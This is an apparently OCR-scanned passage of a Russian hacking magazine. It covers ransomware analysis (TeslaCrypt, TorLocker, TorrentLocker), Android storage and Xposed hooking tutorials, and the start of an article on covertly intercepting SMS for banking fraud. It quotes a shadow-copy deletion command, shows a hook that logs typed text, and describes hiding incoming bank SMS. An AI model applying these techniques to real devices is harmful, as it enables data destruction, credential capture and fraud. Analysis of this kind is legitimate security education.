Backup и другие). Некоторые локеры-шифровальщики используют эту утилиту
для уничтожения всех созданных теневых копий, что, соответственно, делает
невозможным восстановление зашифрованных файлов. Как правило, в этом
случае команда выглядит как vssadmin.exe delete shadows /all /quiet, где
параметр delete  shadows обозначает как раз удаление теневых копий, па-
раметр /all говорит о том, что необходимо удалить все теневые копии, а па-
раметр /quiet указывает, что все действия необходимо провести незаметно
для пользователя, без вывода на экран каких-либо сообщений.



   Интересная особенность последней версии TeslaCrypt — отказ от GUI-ок-
на для вывода сообщения с требованием об оплате и вывод этого сообще-





Служебная информация TeslaCrypt, сохраненная в реестре
ния в виде HTML-страницы, которая копирует такую же у CryptoWall’а (при этом
TeslaCrypt выдает себя за нашумевший CryptoWall, очевидно, чтобы еще боль-
ше запугать жертву).





Страница с требованием оплаты, где TeslaCrypt выдает себя за CryptoWall

Связь с командным сервером
В теле трояна содержится статический список адресов C&C. Сами серверы на-
ходятся в сети Tor, но коммуникация устанавливается через обычный web с по-
мощью сервисов tor2web (в исследуемом семпле использовался tor2web.org).
  В TeslaCrypt первых версий запросы к командному серверу отправлялись
в открытом виде, в последующих версиях стали шифроваться алгоритмом
AES-256-CBC. В качестве ключа берется хеш SHA-256 от строки, содержа-
щейся в теле зловреда.

Приемы, затрудняющие анализ
В отдельном потоке трой, используя API-функции CreateToolhelp32Snapshot,
Process32First и Process32Next, ищет процессы с именами taskmgr.exe,
regedit.exe, cmd.exe, procexp.exe, msconfig.exe и завершает их.
  Помимо этого, все строки в явном виде в теле зловреда не хранятся и скры-
ты от невооруженного взгляда не очень сложным шифрованием.

TORLOCKER
Первая атака с использованием этого локера была зафиксирована осенью
прошлого года. Практически во всех случаях семплы TorLocker’а относятся
к двум версиям 1.0 (на английском языке) и 2.0 (на английском и японском язы-
ках). Основное различие между версиями заключается в методах затруднения
анализа кода и используемом источнике дополнительных модулей: в версии
2.0 эти модули скачиваются из интернета, тогда как в версии 1.0 они извлека-
ются из секции данных.

Шифрование файлов
TorLocker покушается на огромное количество типов файлов, от офисных до-
кументов пользователя, видео- и аудиозаписей, изображений до файлов вир-
туальных машин, ключей шифрования, сертификатов и прочего:

.3gp .7z .accdb .ai .aiff .arw .avi .backup .bay .bin .blend .cdr .cer
.cr2 .crt .crw .dat .dbf .dcr .der .dit .dng .doc .docm .docx .dwg .dxf
.dxg .edb .eps .erf .flac .gif .hdd .indd .jpe .jpg .jpeg .kdc .kwm .log
.m2ts .m4p .mdb .mdf .mef .mkv .mov .mp3 .mp4 .mpg .mpeg .mrw .ndf .nef
.nrw .nvram .odb .odm .odp .ods .odt .ogg .orf .p12 .p7b .p7c .pdd .pdf
.pef .pem .pfx .pif .png .ppt .pptm .pptx .psd .pst .ptx .pwm .qcow .qcow2
.qed .r3d .raf .rar .raw .rtf .rvt .rw2 .rwl .sav .sql .srf .srw .stm
.txt .vbox .vdi .vhd .vhdx .vmdk .vmsd .vmx .vmxf .vob .wav .wb2 .wma .wmv
.wpd .wps .xlk .xls .xlsb .xlsm .xlsx .zip

При запуске TorLocker, используя имя компьютера и серийный номер логиче-
ского диска, выбирает один из 128 зашитых в тело публичных RSA-ключей.
  Файлы шифруются алгоритмом AES-256, при этом для каждого файла ге-
нерируется свой ключ шифрования. Если размер файла больше 512 Мбайт, то
шифруются только первые 512 Мбайт файла. В конец каждого файла дописы-
вается служебная информация размером 512 байт: 32 байта паддинга, 4 бай-
та идентификатора TorLocker’а и 476 байт — использованный ключ AES-256,
зашифрованный с помощью RSA-2048 выбранным в начале работы троя пу-
бличным ключом. Зашифрованные данные в файл пишутся поверх незашиф-
рованных, и создание нового файла с удалением старого не происходит. На-
звание и расширение зашифрованных файлов не изменяются.





Окно с требованием оплаты от TorLocker 2.0


Связь с командным сервером
Связь с командным сервером устанавливается уже после того, как все файлы
будут зашифрованы. Из-за этого работа трояна незаметна и ее невозможно
выявить по нетипичной сетевой активности.
  Все адреса командных серверов прописаны в теле троя, связь с ними
осуществляется посредством Tor-клиента tor.exe и с использованием прокси
polipo.exe. Эти два файла либо извлекаются из секции данных зловреда (в вер-
сии 1.0), либо качаются из Сети (в версии 2.0).
Имена командных серверов в теле TorLocker 2.0





Скачивание и запуск tor.exe и polipo.exe в TorLocker 2.0

Приемы, затрудняющие анализ
Обычно представители этого семейства упакованы UPX, кроме этого, секция
данных зашифрована с помощью алгоритма AES с 256-битным ключом (при
этом первые четыре байта этого ключа записываются в конец зашифрованных
файлов и используются как идентификатор конкретного семпла трояна).
  Сам код щедро разбавлен последовательностями ничего не значащих
и не выполняемых ни при каких условиях команд (так называемые висячие бай-
ты), которые обходятся командой безусловного перехода.
Функция настройки криптоконтейнера в TorLocker 2.0
(до и после нее видны «висячие байты»)


При запуске TorLocker создает отдельный поток, который, используя API-функ-
ции CreateToolhelp32Snapshot, Process32First и Process32Next, ищет процессы
с именами taskmgr.exe, regedit.exe, procexp.exe, procexp64.exe и завершает их.

TORRENTLOCKER
Первые заражения этим локером были зафиксированы в начале февраля 2014
года. Название взято из имени раздела реестра Bit Torrent Application, который
создавался первыми версиями этого локера для хранения служебной инфор-
мации. Данный зловред распространялся исключительно путем спам-рассы-
лок зараженных писем.

Шифрование файлов
TorrentLocker шифрует порядка 250 разных типов файлов, что делает невоз-
можным любую продуктивную деятельность на зараженном компьютере.
Для шифрования файлов используется алгоритм AES-256-CBC (первые вер-
сии использовали алгоритм AES-256-CTR, для всех файлов использовался
один и тот же ключ, а также вектор инициализации, что делало алгоритм уяз-
вимым и давало возможность восстановить файлы без материальных затрат).
   AES-ключ генерируется один раз на основе значений, получаемых от несколь-
ких API-функций (GetTickCount, GetCurrentProcessId, GetCurrentThreadId,
GetProcessHeap, GetThreadTimes, GetProcessTimes). После шифрования фай-
лов AES-ключ шифруется публичным ключом RSA, который находится в фай-
ле вредоносной программы и записывается в конец зашифрованного файла
вместе с контрольной суммой AES-ключа и значением длины зашифрованно-
го AES-ключа. Для снижения нагрузки на процессор и уменьшения времени
шифрования TorrentLocker шифрует только первые два мегабайта файла (раз-
умеется, если файл больше этих самых двух мегабайт, в противном случае
файл шифруется полностью). Для реализации алгоритмов шифрования при-
меняется свободно распространяемая библиотека LibTomCrypt.

Связь с командным сервером
В первых версиях связь с командным центром устанавливалась по жестко про-
шитому в теле локера адресу. В более поздних версиях (после октября 2014
года) был добавлен алгоритм динамической генерации адресов, который на-
чинал свою работу, если не удавалось связаться с захардкоженным C&C-сер-
вером. Он выдавал вспомогательный список из тридцати доменных имен ко-
мандного центра.
   Весь трафик шифруется либо с помощью SSL-протокола, либо с помощью
алгоритма chain-XOR. На командный сервер передается информация, по-
зволяющая идентифицировать пользователя (она вырабатывается из имени
компьютера, даты установки системы и версии ОС). Этот идентификатор по-
зволяет впоследствии установить факт оплаты и предоставить возможность
расшифровки файлов.

Приемы, затрудняющие анализ
TorrentLocker использует несколько приемов противодействия отладке и об-
наружения виртуального окружения. В частности, при помощи API-функции
OutputDebugString которая вызывается в цикле 320 500 раз. Под дебаггером
это вызывает зависание процесса отладки.
  Кроме того, используется двухуровневое шифрование кода троя с исполь-
зованием алгоритма RC4. После расшифровки трой внедряет код, непосред-
ственно ответственный за выполнение вредоносных функций локера, в про-
цессы explorer.exe и svchost.exe.
АнтиВМ в TorrentLocker





Антиотладка в TorrentLocker на базе OutputDebugString
ЗАКЛЮЧЕНИЕ
Напоследок стоит отметить, что угроза подвергнуться атаке какого-нибудь но-
воявленного локера-шифровальщика в настоящее время довольно актуальна.
В большинстве применяемых на сегодня локеров используются все самые со-
временные достижения криптографии, и далеко не всегда есть возможность
восстановить свои файлы без помощи авторов такого рода малвари и созда-
телей этого бизнеса.


WARNING
Если ты захочешь последовать нашему примеру и поисследовать какой-
нибудь образец локера-шифровальщика, то будь аккуратен. Даже
при использовании виртуалки можно неосторожно зашифровать файлы
на расшаренных папках основной системы.





Редакция журнала «Хакер» официально подтверждает истинность этого варнинга
с помощью нотариально заверенного скриншота переписки с Евгением :)
Кодинг
 СХОРОНЯЙ
ПРАВИЛЬНО
  РАСКЛАДЫВАЕМ ПОЛЬЗОВАТЕЛЬСКУЮ
 ИНФОРМАЦИЮ В ANDROID ПО ПОЛОЧКАМ





                                       Андрей Пахомов
                                                     mailforpahomov
                                                  @gmail.com
Google Play market предлагает сотни
вариантов реализации практически лю-
бой идеи. Но хорошо продаются только
приложения, создающие ощущение,
будто они написаны именно для тебя.
Сохранение настроек и любой другой          INFO
пользовательской информации — глав-                                                                          Параллельно с изу-
                                                                        чением любого обу-ное качество user-friendly приложения.                                                                     чающего материала
                                                                       рекомендую проли-Разработчики SDK предоставили бога-
тый выбор способов для хранения из-         руководство.стать официальноеAndroid
меняемых данных. Нам нужно только            развивается очень                                                                              быстро, и примеры,
                                                                        приведенные на сто-выбрать самый удобный и экономичный
                                                                          ронних ресурсах, уже
(не забываем про производительность).       могли устареть.
А теперь подробно рассмотрим, какие
инструменты есть в мире Android!





Рис. 1. Наглядное отображение способов хранения данных в Android
Shared Preferences
Shared Preferences — самый простой и популярный способ хранения данных.
Часто упоминается в нашем журнале и вообще лидер по выдаче поисковых за-
просов в Гугле:). Подходит для жонглирования информацией, умещающейся
в одну переменную. Если нужно запомнить какое-то число, строку или булеву
переменную — это твой выбор. Хранение данных реализовано по связи «ключ —
значение», что позволяет легко и быстро их читать и модифицировать. Из не-
достатков — нет возможности хранить сложноструктурированную информа-
цию, а также затруднен поиск по имеющимся данным: чтобы получить значение
поля, нужно точно знать ключ, перебор не предусмотрен.





Internal Storage
Хранение данных непосредственно в памяти устройства — самый безопасный
способ уберечь данные от шаловливых рук пользователя. Файл будет доступен
только для создавшего его приложения, на нерутованном устройстве доступ
к таким данным извне получить не удастся, при удалении приложения будет
удален и сам файл. До API версии 17 была возможность предоставить доступ
другим программам на чтение и запись, теперь же эта функция считается уста-
ревшей (deprecated), и лучше ее не использовать.
  При работе с Internal Storage помни, что со встроенной памятью устройства
нужно обращаться аккуратно: лимитирован как объем, так и количество циклов
записи на нее. При слишком активном использовании велик риск «убить» аппа-
рат, пользователь спасибо не скажет.
External Storage
В качестве внешнего носителя может выступать как извлекаемая флеш-кар-
та, так и встроенная память телефона. Такие данные легко доступны извне —
и другим приложениям, и пользователю. Поэтому при обращении к ним нужно
быть внимательным, сохраненный файл или даже вся флеш-карта могут быть
в определенный момент недоступны. Лучше всего подходит для хранения мас-
сивных данных: дампов, фотографий, документов и прочего. Не стоит жестко
фиксировать путь к файлам на внутренней или внешней памяти, структура па-
пок может меняться в зависимости от версии операционной системы, и есть
риск некорректной работы.
   Для доступа к папкам со стандартным содержимым (видео, музыка, изо-
бражения и так далее) существует класс android.os.Environment, который пре-
доставит путь к ним. Вот так будет выглядеть сохранение изображения с воз-
можностью показывать его в стандартной галерее:
Чтение и запись будут аналогичны использованию внутренней памяти. Отличие
только в том, что необходимо указать полный путь к файлу, а также проверить,
доступен ли носитель вообще.

SQLite Databases
Для работы со структурированными данными в Android есть возможность со-
здать свою базу данных внутри приложения. Естественно, производительность
(и функционал) у нее будет ниже, чем у полноценных MySQL или PostgreSQL,
но для мобильных приложений вполне достаточно. Этот метод хранения данных
спасает от изобретения велосипеда: нет нужды сбрасывать все в файл, а по-
том писать парсер, все упрощается до SQL-запросов.
   Как ты уже догадался, тебе необходимо минимальное знание SQL — без
этого сейчас никуда, в жизни обязательно пригодится:). Мы создадим свою
базу данных с поставщиком содержимого, а потом получим к ней доступ из сто-
роннего приложения.
Ввиду жесткой модели безопасности и разграничения доступа созданная база
данных по умолчанию доступна только внутри приложения. Для обмена данны-
ми между приложениями требуется использовать так называемый поставщик
содержимого  (Content Provider). С помощью этого инструмента можно пре-
доставить другим приложениям как структурированную информацию из базы
данных, так и отдельные файлы, хранящиеся во внутренней памяти. Существу-
ют стандартные поставщики содержимого: телефонная книга, календарь, бра-
узер и другие.
  В Android реализован богатый и гибкий функционал для работы с базами
данных, в следующих выпусках нашего журнала мы обязательно об этом рас-
скажем. А сегодня мы будем лаконичны, поэтому информацию добавим тоже
через класс ContentProvider. Он позволяет создавать, читать, обновлять и уда-
лять записи (так называемый CRUD-подход для работы с данными).
В стороннем приложении требуется реализовать класс СursorLoader, который
позволяет по указанной ссылке асинхронно прочитать данные и получить их
в виде объекта Cursor.
Рис. 2. Пример работы поставщика содержимого
Network Connection
Пользовательские данные хранятся на сервере во всех
«взрослых» приложениях: юзеру это добавляет комфорта,
он может входить в один свой аккаунт сразу на нескольких
устройствах, а заинтересованным личностям такой подход
упрощает анализ пользовательских предпочтений и другие
маркетинговые операции;). Загрузить информацию с серве-       INFO
ра в интернете можно с помощью стандартных протоколов
                                                                               Как показывает
HTTP и FTP. Мы уже не раз передавали данные через сеть,                                                                                     статистика, в мире
рекомендую тебе пролистать предыдущие статьи.               еще достаточно
                                                                                пользователей
                                                                                с Android версии 3Cache files                                                                         и ниже. Они могут
Объем ресурсов, выделяемых для каждого приложения, жест-      стать твоими по-
ко лимитирован, поэтому рано или поздно потребуется сбро-     купателями, поэ-
                                                                             тому имеет смыслсить на диск какие-либо временные данные. Для этого суще-
                                                                            максимально
ствует механизм кеширования, и он удобно реализован                                                                                снизить параметр
в Android. Временные файлы можно хранить как во внутренней      minSdkVersion.
(Internal cache), так и во внешней памяти (External cache).
  При использовании внутренней памяти нужно помнить, что
при нехватке свободного места на устройстве операционная
система в первую очередь будет удалять временные файлы.
Сам файл создается методом createTempFile (). В качестве ар-
гументов он принимает имя файла, расширение (по желанию)                                   WWW
и путь к папке. Папку для таких файлов лучше создавать автома-
тически методами getCacheDir () и getExternalCacheDir (). При   Подробнее о постав-
                                                                        щиках содержимогоудалении приложения все временные файлы будут также в обя-
зательном порядке удалены (в том числе и с внешнего носите-        Больше
ля), в этом их главное отличие от обычных файлов.                    о базах данных





Заключение
Сегодня мы увидели, что у Android-разработчика существует множество вариантов
для работы с пользовательскими данными. Теперь у тебя точно нет повода застав-
лять пользователя вводить логин или лезть в настройки при каждом запуске про-
граммы. Как всегда, если есть вопросы — готов ответить через почту :). Удачи!
КОДИНГ
РОБОТИЗИРОВАННЫЕ
ХУКИПЕРЕХВАТЫВАЕМ
ВЫЗОВЫ
В ОС ANDROID
 Любой читатель нашего жур-
 нала как минимум что-то
 слышал о возможности пе-
 рехвата вызовов в различ-
 ных операционных системах.
 А скорее всего, активно этим
 пользовался — по крайней
 мере в винде. Если вкрат-
 це, ты можешь перехватить
 вызов какой-то функции
 и как-нибудь этим распоря-
 диться: использовать па-
 раметры по своему усмот-
 рению, выполнить свой код
 вместо того, который дол-
 жен был выполниться. Се-                                                                     Иван Смирнов,
                                                           ведущий разработчик Labster.PRO годня мы будем делать это
                                                                                                          labster.pro
 в ОС Android!
НЕМНОГО ТЕОРИИ


Достаточно каноничным примером использования хуков являются так назы-
ваемые соксификаторы — фактически они перехватывают функцию под-
ключения к серверу, подсоединяются в этот момент к SOCKS-прокси и вместо
оригинального дескриптора сокета возвращают тот дескриптор, который под-



Несколько лет назад появилась прекрасная вещь — Xposed Framework
для Android. Что это такое? Это фреймворк, позволяющий перехватывать вызо-
вы Java-методов в Android-приложениях. Он дает большой простор для моди-
фикации поведения приложений, установленных на устройство, — от просто-
го калькулятора до SystemUI, отвечающего (да-да, Кэп) за работу системного
интерфейса.
  Для начала давай посмотрим, как оно работает.

Внутреннее устройство Xposed Framework
В Android есть процесс под названием Zygote, он отвечает за формирование
среды исполнения для каждого Android-приложения (путем форка самого
себя). За его запуск отвечает бинарник app_process, который стартует в мо-
мент инициализации Android.
   Xposed при установке заменяет app_process своим модифицированным,
а также добавляет файл XposedBridge.jar. Модифицированный app_process
загружает XposedBridge, который и перехватывает вызовы заданных методов,
заменяя их своими.
   Как он понимает, что чем заменять? Xposed — вещь модульная. Сам по себе
он почти ничего не заменяет. При инициализации он загружает установленные
модули и уже из них берет информацию о том, что перехватывать и куда пере-
давать управление. Сами по себе модули — это, по большому счету, обычные
APK, только немного дополненные специфичной для Xposed информацией.
   Конечно же, есть у него и минусы — такой подход не может не сказаться
на производительности и стабильности системы. Доступ к различным частям
системы внутри этого фреймворка никак не контролируется — любой модуль
может перехватить любой вызов, будь то обычное приложение или системное.
Если «хуки» вызываются часто и работают не слишком быстро, то система нач-
нет тормозить и кушать батарейку (хоть это и стандартное для андроида по-
ведение, хе-хе). Если модуль плохо протестирован — в лучшем случае что-то
будет некорректно работать или падать. А может выйти и так, что система вооб-
ще перестанет грузиться (я пару раз случайно доводил ее до такого состояния
в процессе разработки. Помогает только перепрошивка, потому что удалить
модуль на этапе загрузки системы тоже нельзя, не имея кастомного рекавери).
   Ладно, хватит теории, переходим к практике! Установи Xposed на свой де-
вайс (думаю, с этим ты разберешься сам), и поехали.

HELLO, WORLD!
Давай начнем с того, что напишем своеобразный «Hello, world» с использова-
нием Xposed Framework.
  По сути, модуль Xposed — это обычный Android-проект с дополнительными
файлами. Создадим новый проект в Android Studio. Графического интерфей-
са у нас не будет, поэтому Activity создавать не надо. Первым делом добавим
в манифест (внутрь тега <application>) параметры, которые нужны для отобра-
жения информации о нашем модуле, а также минимально требуемую версию
фреймворка.





Далее нужно добавить в проект библиотеку XposedBridgeApi-54.jar — в ней,
как нетрудно догадаться из названия, содержатся классы, необходимые
для работы с Xposed Framework. Обрати внимание — эта библиотека должна
быть помечена как provided, а не compile.
   Теперь можно начинать кодить. Создаем класс HelloWorld, реализующий
интерфейс IXposedHookLoadPackage. Нам нужно будет переопределить лишь
один метод — handleLoadPackage. Он вызывается при запуске какого-либо па-
кета (как ни странно), в нем мы и будем устанавливать хуки на необходимые
нам методы. Пока что этот метод будет выглядеть так:





Для того чтобы у нас получился минимально рабочий модуль, нужно совершить
еще одно действие. Создаем файлик xposed_init в директории assets нашего
проекта. В нем указываем одну строчку — полное имя класса, который нужно
будет загрузить. В моем случае это pro.labster.xposedhello.HelloWorld, где pro.
labster.xposedhello — имя пакета, HelloWorld — имя класса.
   Теперь собираем и устанавливаем APK, в статусбаре устройства появится
иконка Xposed Installer’а. Нажимаем на нее и ставим галочку напротив нашего
модуля. Чтобы он заработал, остается лишь перезагрузить устройство. После
перезагрузки в LogCat ты должен увидеть строчки вроде этих:

08-16 01:20:25.649      873-873/? I/XposedHello﹕
    Package loaded: android
08-16 01:20:29.919      873-873/? I/XposedHello﹕
    Package loaded: com.android.providers.settings
08-16 01:20:29.959      873-873/? I/XposedHello﹕
    Package loaded: com.sec.android.providers.security
08-16 01:20:32.749    1087-1087/? I/XposedHello﹕
    Package loaded: com.android.keyguard
08-16 01:20:33.229    1087-1087/? I/XposedHello﹕
    Package loaded: com.android.systemui

Это те самые логи, которые ведутся нашим кодом, — поздравляю, оно работает!
  Едем дальше. Для начала давай изменим текст в статусбаре нашего девай-
са — там, где отображаются часы. Статусбар находится в пакете com.android.
systemui. Нужный нам метод updateClock объявлен в классе com.android.
systemui.statusbar.policy.Clock и выглядит примерно так:





Давай же его переопределим.
Что мы делаем? Сразу, как загрузится пакет com.android.systemui, нахо-
дим в заданном классе нужный нам метод. Как только он вызывается, сра-
батывает XC_MethodHook. В нем есть два метода — beforeHookedMethod
и afterHookedMethod. Они вызываются до и после вызова оригинального ме-
тода. Нам нужен второй, поскольку мы хотим обновить текст уже после его об-
новления оригинальным методом. Собери, переустанови наш модуль, пере-
загрузи устройство и смотри на часы :).





Модифицированные часы
БОЛЕЕ ИНТЕРЕСНЫЙ ПРИМЕР
А теперь давай сделаем кое-что посложнее и повеселее. Представим, что пе-
ред нами стоит задача перехватить вводимый в поля текст (email’а, да и во-
обще чего угодно). Естественно, только для сбора статистики, ничего крими-
нального. Как известно, полем для ввода текста в Android служит класс EditText,
а текст из него получается методом getText(). То есть нам нужно перехватить
вызов этого метода, что делается следующим образом:





В принципе, ничего сложного. Находим ме-
тод getText в классе android.widget.EditText,
устанавливаем на него хук. При срабатыва-
нии хука проверяем, чтобы возвращаемое
значение (param.getResult()) было не нулем
и инстансом класса SpannableStringBuilder
(на всякий случай — мало ли что там какой
производитель нагородит), получаем и вы-
водим в логи текст.





        INFO         WWW

 При разработке модулей обяза-        Автор Xposed
 тельно ориентируйся на макси-      Framework на GitHub
 мальную производительность.        Xposed Installer
   Это действительно важно.                       Пример полей для ввода текста
ЗАКЛЮЧЕНИЕ
С точки зрения разработки в использовании этого фреймворка нет ничего
сложного. Трудности возникают при поиске того, что именно надо переопре-
делить, — если это опенсорсное приложение, то потребуется немного поко-
паться в исходниках и найти нужные методы и их сигнатуры. Сложнее, если
приложение проприетарное, — тогда придется его декомпилировать.
   Xposed Framework — очень интересная и мощная вещь, при этом сама
по себе не вносящая серьезных изменений в систему, что делает исполь-
зование фреймворка достаточно безопасным. Он, судя по количеству по-
стов на тематических форумах, весьма популярен. Одна-
ко использовать модули и с форумов, и из официального
репозитория довольно рискованно — модули там особо
не модерируются, они могут серьезно замедлить твое
устройство, сделать работу с ним невозможной (если мо-
дуль по какой-то причине несовместим с твоей версией ОС)
или устроить что-то еще более плохое (если ты понимаешь,    WWW
о чем я).
                                                                       На xakep.ru ты
  В общем, экспериментируй — Xposed Framework дает                                                                       найдешь исходники
огромный простор для творчества. До встречи!                          проекта.
КОДИНГ
ЗЛЫЕ СМСИССЛЕДУЕМ СКРЫТЫЕ
                                                                        Сергей Мельников
                                                                                                mail@s-melnikov.net,МЕХАНИЗМЫ РАБОТЫ                                                                                            www.s-melnikov.net
С СМС В ANDROID


  Только представь: у всех жителей средней полосы осень,
  а ты тусуешься на морях, солнце лениво замерло в зе-
  ните, ты лежишь на жемчужном пляже одного из Маль-
  дивских островов, любуешься окружающими пейзажами
  и проходящими девушками в бикини, потягивая кок-
  тейль... А много позже, вечером, ты обнаруживаешь, что
  на счете твоей пластиковой карточки пусто! Как же так?
 Мобильный банк с информированием подключен, все
  операции вроде бы подтверждаются по СМС... Примерно
  такие вопросы стали недавно задавать вслух клиенты од-
  ного крупного банка с зеленым логотипом.
ВМЕСТО ЭПИГРАФА
Как ты уже понял, речь сегодня пойдет о махинаци-
ях с мобильным банком, а в частности — о неодно-
значной работе с СМС в Андроиде. Хочу сразу пред-
упредить: представленный материал не является
чем-то приватным (пример работы с СМС вполне        WARNING
доступен в официальном SDK от Google), никаких                                                               Вся информация предоставлена
0day-эксплоитов ты здесь не найдешь, более того,      исключительно в ознакоми-
я даже не утверждаю, что все происходит (или про-      тельных целях. Ни редакция,
                                                                 ни автор не несут ответственно-исходило) именно так, как описано. Считай, что все
                                                                        сти за любой возможный вред,
события вымышлены, а совпадения случайны. Итак,                                                                  причиненный материалами
в одной очень далекой галактике...                               данной статьи.

ПОЛУЧЕНИЕ СМС
...У нас есть смартфон с Android на борту (без root’а) и мы хотим написать при-
ложение, контролирующее работу с короткими текстовыми сообщениями.
А именно — попробуем скрытно что-нибудь получить.
   Когда устройство принимает сообщение, срабатывает широковещатель-
ное намерение со стандартным действием android.provider.Telephony.SMS_
RECEIVED. И вот первая странность — данное действие не указано в SDK в виде
константы, то есть этот строковый литерал нужно прописывать в коде явно:




Для приложений, отслеживающих намерения, связанные с получением СМС,
необходимо запросить разрешение в манифесте проекта:




При установке такого приложения пользова-
тель увидит запрос, приведенный на рис. 1.
Казалось бы, черным по белому написано,
что приложение хочет принимать/отправлять
СМС... Но, как показывает практика социаль-
ной инженерии, большой процент пользо-
вателей нажмет «Установить» не глядя, со-
вершенно не задумываясь, зачем, например,
«Критическому обновлению системы Andoid /                                                        Рис. 1. «Критическое» обновление?!
Браузеру / Adobe Flash / Банковскому ПО...»,    Поставим?
взявшемуся непонятно откуда (!), нужно получать текстовые сообщения.
  Для обработки намерения SMS_RECEIVED в манифесте приложения необ-
ходимо зарегистрировать широковещательный приемник (за подробностями
отправляю тебя к прошлым статьям рубрики «Кодинг»):





С этого момента зарегистрированный приемник будет принимать входящие
СМС, даже если приложение не запущено, даже если телефон перезагружен!
  Нужно сказать, что таких приемников может быть несколько и они сработают
друг за другом в соответствии с приоритетом, указанным в поле android:priority.
Максимальное значение — 1000, а вот у стандартного обработчика Android
(который помещает СМС в папку «Входящие», выводит уведомление и вибри-
рует) — и это вторая странность — 999. Хотя, если подумать, объяснение до-
статочно простое: на платформе Android все программы имеют одинаковый
статус и написаны на одном и том же API, что позволяет пользователям легко
удалять или заменять встроенные ПО на альтернативные разработки, будь то
почтовый клиент, приложение для дозвона или программа для работы с сооб-
щениями.
   Таким образом, указанный выше приемник EvilSMSReceiver сработает пер-
вым, а стандартный — следом. Типичная реализация широковещательного
приемника СМС представлена ниже:
Намерение с действием SMS_RECEIVED содержит информацию обо всех ча-
стях входящего сообщения (длинное СМС при передаче автоматически раз-
бивается на несколько). Чтобы извлечь массив объектов SmsMessage, упако-
ванных внутри дополнительного параметра Intent, используется стандартный
ключ — intent.getExtras().get(«pdus»). Полученный массив имеет формат PDU
(protocol data unit), и для приведения в человеческий вид используется метод
SmsMessage.createFromPdu. Далее в цикле сообщение собирается в единое
целое, также определяется отправитель (from), дата и время отправки (when).
  В сущности, все это уже не раз рассматривалось на страницах «Хакера»
и вполне предсказуемо. А дальше начинается самое интересное: мы смотрим
на отправителя и, если его номер 800 (вымышленный, конечно же), начинаем
«работать» с этим сообщением особым образом, после чего вызываем метод
abortBroadcast, блокирующий дальнейшую обработку другими приемниками.
Это сообщение пользователь уже не увидит никогда...

GOOGLE НАНОСИТ ОТВЕТНЫЙ УДАР
Все сказанное прекрасно работало до версии Android 4.4 (которых, кстати,
и сейчас в дикой природе достаточно много). Хрустящие палочки надломили
(правильнее сказать, нагнули) весь процесс работы с текстовыми сообщения-
ми в этой ОС. Было введено понятие «приложение для работы с СМС по умол-
чанию», задать которое должен сам пользователь (см. рис. 2). Причем только
это приложение имеет полный доступ на запись и удаление в базе сообщений
(так называемый SMS Provider, о котором мы еще поговорим) смартфона (пап-
ки «Входящие», «Исходящие» и так далее), тогда как другие — только на обра-
ботку широковещательного намерения (об этом ниже). Кроме того, прервать
обработку входящего сообщения с помощью abortBroadcast больше не пред-
ставляется возможным.
   Когда это обновление добралось до пользователей, внезапно выяснилось,
что все безобидные и, безусловно, нужные приложения для создания резерв-
ных копий информации с телефона перестали восстанавливать СМС из бэка-
па, что вызвало дружное снижение оценок первых в Google Play. Пользователям
предложили вручную менять приложение по умолчанию на то, которое работа-
ет с резервной копией, а потом возвращать обратно. Что тут скажешь, за без-
опасность всегда нужно платить удобством.
  Для разработчиков же все только начиналось. Вместо SMS_RECEIVED
были введены сразу два широковещательных намерения: SMS_RECEIVED_
ACTION и SMS_DELIVER_ACTION. Первое очень напоминает по характеру
SMS_RECEIVED, но позволяет всего лишь извлечь полученное сообщение —
ни abortBroadcast, ни какие-либо манипуляции на «запись и удаление» в базе
сообщений не сработают, то есть факт получения СМС скрыть уже так просто
не удастся.
  Намерение SMS_DELIVER_ACTION получит только то приложение, которое
выбрано для работы с СМС по умолчанию. Оно-то и будет обладать всеми пра-
вами для непосредственной работы с базой сообщений (SMS Provider). Чтобы
приложение стало избранным, то есть приложением по умолчанию, можно по-
пытаться отправить запрос пользователю:





Но тогда на экране появится диалоговое окно
(см. рис. 3), не заметить которое сложновато.
Хотя я не сомневаюсь, что и здесь найдутся
«остроумные» пользователи, ответившие по-
ложительно. Мы же попробуем зайти с другой
стороны.
   Пользователь  форума   xda-developers.
com с ником stepic, исследуя исходный текст
                                                       Рис. 3. «Да, нет...» Стоит до-Android, обнаружил, что приложение для ра-                                                    бавить вариант «Не знаю»
боты с СМС по умолчанию обладает всего
лишь специальным разрешением на запись
СМС — OP_WRITE_SMS:





Установить такое разрешение можно с помощью скрытого (от глаз пользова-
теля) менеджера разрешений App Ops. Этот фреймворк, запрятанный глубоко
в недрах системы Android, позволяет управлять разрешениями для отдельных
приложений. Обычно при установке приложения пользователь должен сразу
соглашаться со всем списком разрешений или вовсе отказаться от дальней-
шей установки. Часто хочется ограничить приложение более гибко, например
из всего списка разрешений запретить только отслеживание местоположе-
ния. App Ops позволяет с легкостью провернуть этот трюк — да, приложение
от неожиданности может и упасть, но почему бы не попробовать?
   Начиная с Android 4.3, вызвать App Ops можно из консоли:

adb shell am start -a android.settings.SETTINGS
   -e “:android:show_fragment”
   “com.android.settings.applications.AppOpsSummary”

Или непосредственно из кода:





Если перейти на вкладку Messaging, то можно за-
метить, что у недефолтного приложения для ра-
боты с СМС флаг записи сброшен — WRITE SMS
OFF (см. рис. 4), но здесь же его можно и устано-
вить (при этом root не нужен!).

GOOGLE НАНОСИТ ВТОРОЙ
ОТВЕТНЫЙ УДАР
Рассмотренный выше App Ops был замечен
прогрессивной общественностью и взят на во-
оружение. Разумеется, гибкая настройка раз-
решений очень не понравилась Google — как же
показывать рекламу, если можно отрубить вы-
борочно доступ в сеть? Сославшись на то, что
App Ops не предназначен для конечных пользо-
вателей, интернет-гигант тихо прикрыл лавочку
в Android 4.4.2, косвенно залатав еще одну ла-
зейку теневой работы с СМС.                                                        Рис. 4. App Ops собственной
                                                    персоной
ПИШИТЕ В СПОРТЛОТО
А как же с отправкой СМС, спросишь ты? В Android за работу с СМС отвечает
класс SmsManager. Для получения ссылки на объект этого класса можно ис-
пользовать метод getDefault:



Также потребуется специальное полномочие SEND_SMS в манифесте:



Кстати, в настоящее время API в Android не поддерживает создание ММС вну-
три сторонних приложений, то есть для отправки мультимедийных сообщений
в любом случае нужно использовать стандартное приложение.
  Для отправки текстового сообщения используется метод sendTextMessage
объекта SmsManager, в который передается телефонный номер получателя
и текст сообщения:





где второй параметр позволяет указать центр обработки сообщений (SMSC),
при передаче null используется стандартный центр, предоставляемый опера-
тором сотовой связи. Последние два параметра позволяют задать намере-
ния (Intent) для отслеживания передачи и успешной доставки сообщения. Так
как нас не особо интересуют такие мелочи, просто указываем null.
   Отосланное таким образом сообщение попадет в папку «Отправленные»,
